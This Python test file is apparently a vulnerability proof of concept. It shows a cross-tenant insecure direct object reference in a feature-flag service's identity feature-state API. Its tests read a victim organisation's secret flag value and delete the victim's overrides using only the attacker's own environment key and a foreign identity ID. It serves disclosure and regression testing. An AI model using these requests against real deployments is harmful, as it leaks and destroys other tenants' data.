"""
TEMPORARY PROOF OF CONCEPT for the cross-tenant IDOR on the nested identity
feature-state actions (`all` and `clone-from-given-identity`).

These tests assert the *current, vulnerable* behaviour, so they pass on HEAD and
will fail once the identity lookup is environment-scoped.
"""

import json

import pytest
from common.environments.permissions import VIEW_ENVIRONMENT
from django.urls import reverse
from rest_framework import status
from rest_framework.test import APIClient

from environments.identities.models import Identity
from environments.models import Environment
from features.models import Feature, FeatureState, FeatureStateValue
from organisations.models import Organisation, OrganisationRole
from projects.models import Project
from tests.unit.environments.helpers import get_environment_user_client
from users.models import FFAdminUser

VICTIM_SECRET = "victim-secret-value"


@pytest.fixture()
def victim_environment(db: None) -> Environment:
    organisation = Organisation.objects.create(name="Victim Org")
    project = Project.objects.create(name="Victim Project", organisation=organisation)
    return Environment.objects.create(name="Victim Production", project=project)


@pytest.fixture()
def victim_feature(victim_environment: Environment) -> Feature:
    return Feature.objects.create(
        project=victim_environment.project,
        name="victim_feature",
        initial_value="default",
    )


@pytest.fixture()
def victim_identity(victim_environment: Environment) -> Identity:
    return Identity.objects.create(
        identifier="victim_user", environment=victim_environment
    )


@pytest.fixture()
def victim_override(
    victim_environment: Environment,
    victim_feature: Feature,
    victim_identity: Identity,
) -> FeatureState:
    feature_state = FeatureState.objects.create(
        feature=victim_feature,
        environment=victim_environment,
        identity=victim_identity,
        enabled=True,
    )
    FeatureStateValue.objects.filter(feature_state=feature_state).update(
        string_value=VICTIM_SECRET
    )
    return feature_state


@pytest.fixture()
def attacker_environment(db: None) -> Environment:
    organisation = Organisation.objects.create(name="Attacker Org")
    project = Project.objects.create(name="Attacker Project", organisation=organisation)
    return Environment.objects.create(name="Attacker Production", project=project)


@pytest.fixture()
def attacker_identity(attacker_environment: Environment) -> Identity:
    return Identity.objects.create(
        identifier="attacker_user", environment=attacker_environment
    )


@pytest.fixture()
def attacker_admin_client(attacker_environment: Environment) -> APIClient:
    """Admin of the attacker's own organisation — nothing more."""
    user = FFAdminUser.objects.create(email="attacker_admin@example.com")
    user.add_organisation(
        attacker_environment.project.organisation, role=OrganisationRole.ADMIN
    )
    client = APIClient()
    client.force_authenticate(user)
    return client


@pytest.fixture()
def attacker_viewer_client(attacker_environment: Environment) -> APIClient:
    """Non-admin holding only VIEW_ENVIRONMENT on the attacker's own environment."""
    user = FFAdminUser.objects.create(email="attacker_viewer@example.com")
    user.add_organisation(attacker_environment.project.organisation)
    return get_environment_user_client(
        user=user,
        environment=attacker_environment,
        permission_keys=[VIEW_ENVIRONMENT],
    )


def test_all__foreign_identity_pk__leaks_victim_feature_states(
    attacker_admin_client: APIClient,
    attacker_environment: Environment,
    victim_identity: Identity,
    victim_override: FeatureState,
) -> None:
    # Given
    url = reverse(
        "api-v1:environments:identity-featurestates-all",
        args=[attacker_environment.api_key, victim_identity.id],
    )

    # When
    response = attacker_admin_client.get(url)

    # Then
    assert response.status_code == status.HTTP_200_OK
    assert VICTIM_SECRET in json.dumps(response.json())


def test_all__foreign_identity_pk_as_mere_viewer__leaks_victim_feature_states(
    attacker_viewer_client: APIClient,
    attacker_environment: Environment,
    victim_identity: Identity,
    victim_override: FeatureState,
) -> None:
    """The read needs only VIEW_ENVIRONMENT on an environment the caller owns."""
    # Given
    url = reverse(
        "api-v1:environments:identity-featurestates-all",
        args=[attacker_environment.api_key, victim_identity.id],
    )

    # When
    response = attacker_viewer_client.get(url)

    # Then
    assert response.status_code == status.HTTP_200_OK
    assert VICTIM_SECRET in json.dumps(response.json())


def test_clone__foreign_target_identity__wipes_victim_overrides(
    attacker_admin_client: APIClient,
    attacker_environment: Environment,
    attacker_identity: Identity,
    victim_identity: Identity,
    victim_override: FeatureState,
) -> None:
    """Cloning an override-free source onto a foreign target deletes its overrides."""
    # Given
    url = reverse(
        "api-v1:environments:identity-featurestates-clone-from-given-identity",
        args=[attacker_environment.api_key, victim_identity.id],
    )

    # When
    response = attacker_admin_client.post(
        url,
        data=json.dumps({"source_identity_id": attacker_identity.id}),
        content_type="application/json",
    )

    # Then
    assert response.status_code == status.HTTP_200_OK
    assert not FeatureState.objects.filter(identity=victim_identity).exists()
    # The response also discloses the victim identity's effective flags.
    assert response.json()


def test_clone__as_mere_viewer__returns_forbidden(
    attacker_viewer_client: APIClient,
    attacker_environment: Environment,
    attacker_identity: Identity,
    victim_identity: Identity,
    victim_override: FeatureState,
) -> None:
    """
    `clone_from_given_identity` has no action_permission_map entry, so the
    required permission is None. That only passes via the project/organisation
    admin short-circuit, so a plain viewer is still rejected.
    """
    # Given
    url = reverse(
        "api-v1:environments:identity-featurestates-clone-from-given-identity",
        args=[attacker_environment.api_key, victim_identity.id],
    )

    # When
    response = attacker_viewer_client.post(
        url,
        data=json.dumps({"source_identity_id": attacker_identity.id}),
        content_type="application/json",
    )

    # Then
    assert response.status_code == status.HTTP_403_FORBIDDEN
    assert FeatureState.objects.filter(identity=victim_identity).exists()


def test_clone__foreign_source_identity__errors_without_persisting(
    attacker_admin_client: APIClient,
    attacker_environment: Environment,
    attacker_identity: Identity,
    victim_identity: Identity,
    victim_feature: Feature,
    victim_override: FeatureState,
) -> None:
    """
    Pulling a foreign identity's overrides in as the *source* does not leak them:
    the clone writes a cross-project feature state, which crashes the audit-log
    hook and rolls the whole write back (HTTP 500).
    """
    # Given
    url = reverse(
        "api-v1:environments:identity-featurestates-clone-from-given-identity",
        args=[attacker_environment.api_key, attacker_identity.id],
    )

    # When
    with pytest.raises(AttributeError):
        attacker_admin_client.post(
            url,
            data=json.dumps({"source_identity_id": victim_identity.id}),
            content_type="application/json",
        )

    # Then
    assert not FeatureState.objects.filter(
        environment=attacker_environment, feature=victim_feature
    ).exists()
